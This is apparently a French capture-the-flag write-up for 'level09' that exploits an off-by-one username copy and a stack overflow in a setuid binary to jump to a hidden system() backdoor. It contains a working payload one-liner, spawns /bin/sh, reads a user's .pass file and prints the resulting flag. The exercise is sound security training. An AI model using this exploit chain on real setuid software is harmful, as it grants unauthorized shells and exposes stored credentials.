# level09

```bash
$ ls -l
total 16
-rwsr-s---+ 1 end users 12959 Oct  2  2016 level09
$ file level09
level09: setuid setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454, not stripped
$ gdb -q ./level09
Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x00000000000006f0  _init
0x0000000000000720  strncpy
0x0000000000000720  strncpy@plt
0x0000000000000730  puts
0x0000000000000730  puts@plt
0x0000000000000740  system
0x0000000000000740  system@plt
0x0000000000000750  printf
0x0000000000000750  printf@plt
0x0000000000000760  __libc_start_main
0x0000000000000760  __libc_start_main@plt
0x0000000000000770  fgets
0x0000000000000770  fgets@plt
0x0000000000000780  __cxa_finalize
0x0000000000000780  __cxa_finalize@plt
0x0000000000000790  _start
0x00000000000007bc  call_gmon_start
0x00000000000007e0  __do_global_dtors_aux
0x0000000000000860  frame_dummy
0x000000000000088c  secret_backdoor
0x00000000000008c0  handle_msg
0x0000000000000932  set_msg
0x00000000000009cd  set_username
0x0000000000000aa8  main
0x0000000000000ad0  __libc_csu_init
0x0000000000000b60  __libc_csu_fini
0x0000000000000b70  __do_global_ctors_aux
0x0000000000000ba8  _fini
```

```c
# Decompile set_username
int set_username(__int64 a1)
{
  char s[140]; // [rsp+10h] [rbp-90h] BYREF
  int i; // [rsp+9Ch] [rbp-4h]

  memset(s, 0, 0x80uLL);
  puts(">: Enter your username");
  printf(">>: ");
  fgets(s, 128, stdin);
  for ( i = 0; i <= 40 && s[i]; ++i )
    *(_BYTE *)(a1 + i + 140) = s[i];
  return printf(">: Welcome, %s", (const char *)(a1 + 140));
}
```

Il y a une faille dans la boucle `for` , il va 1 caractère trop loin a chaque fois, nous pouvons donc réécrire la `len` du message

```c
typedef struct s_message
{
    char text[140];		// message destination
    char username[40];		// username destination
    int len;			// 140
} t_message;
```

Pour le `username` ca donne un `payload` comme `"A" * 40 + 0xff + 0x0a`

```bash
Dump of assembler code for function handle_msg:
   0x00005555555548c0 <+0>:     push   %rbp
   0x00005555555548c1 <+1>:     mov    %rsp,%rbp
   0x00005555555548c4 <+4>:     sub    $0xc0,%rsp
   0x00005555555548cb <+11>:    lea    -0xc0(%rbp),%rax # buffer (192 + 8) 200
   0x00005555555548d2 <+18>:    add    $0x8c,%rax
   0x00005555555548d8 <+24>:    movq   $0x0,(%rax)
   0x00005555555548df <+31>:    movq   $0x0,0x8(%rax)
   0x00005555555548e7 <+39>:    movq   $0x0,0x10(%rax)
   0x00005555555548ef <+47>:    movq   $0x0,0x18(%rax)
   0x00005555555548f7 <+55>:    movq   $0x0,0x20(%rax)
   0x00005555555548ff <+63>:    movl   $0x8c,-0xc(%rbp)
   0x0000555555554906 <+70>:    lea    -0xc0(%rbp),%rax
   0x000055555555490d <+77>:    mov    %rax,%rdi
   0x0000555555554910 <+80>:    callq  0x5555555549cd <set_username>
   0x0000555555554915 <+85>:    lea    -0xc0(%rbp),%rax
   0x000055555555491c <+92>:    mov    %rax,%rdi
   0x000055555555491f <+95>:    callq  0x555555554932 <set_msg>
   0x0000555555554924 <+100>:   lea    0x295(%rip),%rdi        # 0x555555554bc0
   0x000055555555492b <+107>:   callq  0x555555554730 <puts@plt>
   0x0000555555554930 <+112>:   leaveq
   0x0000555555554931 <+113>:   retq
End of assembler dump.
```

L’offset est donc de `200` .

```bash
(gdb) info function secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor
```

```bash
# Decompile secret_backdoor
void secret_backdoor()
{
  char buffer[128];

  fgets(buffer, 128, STDIN); # we will use "/bin/sh"
  system(buffer);
}
```

Nous avons donc un deuxième `payload` avec: `"A"*200 + secret_backdoor_addr + 0x0a + "/bin/sh"`

```bash
$ python -c 'print "A"*40 + "\xff" + "\x0a" + "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\x0a" + "/bin/sh"' > /tmp/payload
$ cat /tmp/payload - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

FLAG: `j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`